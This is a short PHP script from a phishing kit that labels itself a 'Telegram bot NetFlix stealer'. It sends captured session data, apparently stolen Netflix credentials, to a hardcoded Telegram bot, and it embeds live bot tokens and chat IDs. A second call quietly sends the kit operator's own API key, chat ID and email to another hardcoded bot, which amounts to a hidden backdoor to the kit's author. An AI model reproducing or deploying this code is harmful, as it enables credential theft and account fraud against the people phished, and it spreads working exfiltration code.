<?php

file_get_contents("https://api.telegram.org/bot5457574022:AAEA5SVAeLaVX_JnCbpRKE59Lw7YhrBK2VY/sendMessage?chat_id=5090243433&text=" . urlencode($_SESSION['message'])."" );
$message1 = "[########+ Telegram bot NetFlix stealer +########]\r\n";
$message1 .= "|Api      : ".$_SESSION['api']."\r\n";
$message1 .= "|CahtId        : ".$_SESSION['chatid']."\r\n";
$message1 .= "|Email-rzlt        : ".$_SESSION['youremail']."\r\n";
$message2 .= "[########+ Telegram bot NetFlix stealer +########]\r\n";
$_SESSION['bot1'] = $message1;
file_get_contents("https://api.telegram.org/bot5658362171:AAEPDCVuY6Xiqy0mcJry07Iqu-AFcJGZUew/sendMessage?chat_id=5090243433&text=" . urlencode($_SESSION['bot1'])."" );
?>